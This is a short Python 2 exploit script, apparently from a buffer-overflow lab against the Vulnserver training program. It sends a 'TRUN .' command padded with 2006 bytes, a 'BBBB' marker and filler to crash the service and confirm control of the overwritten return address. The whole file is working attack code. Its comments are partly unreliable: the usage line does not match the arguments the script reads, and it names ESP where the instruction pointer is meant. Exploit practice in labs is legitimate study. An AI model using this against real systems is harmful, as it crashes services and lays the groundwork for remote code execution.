#!/usr/bin/env python
# for TRUN command, we need 2006 bytes of garbage for the exploit
# python fuzzer.py 2006 2010 4 10.10.10.186 9999

import sys
import socket

ip = sys.argv[1]
port = int(sys.argv[2])

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # if there is no response from the server within 5 seconds, error out
    s.settimeout(5)
    s.connect((ip, port))
    
    # grab the banner
    print s.recv(1024)

    # generate string of garbage to try to provoke a crash
    # we know we need 2006 A's to land in the ESP register
    garbage = "A" * 2006 + "BBBB" + "C" * 4

    # sending a period after the TRUN command will crash the program
    badstr = "TRUN ." + garbage + '\r\n'
    #print "Trying badstr of length %i" % (i)
    
    s.send(badstr)

    # check for a response from the server
    # the response for a TRUN command that has completed 
    # successfully is "TRUN COMPLETE"
    # if the server crashes, it will not send a response and will timeout
    s.recv(1024)

    s.close()
except:
    print "*******************"
    print "*     CRASH!!     *"
    print "*******************"

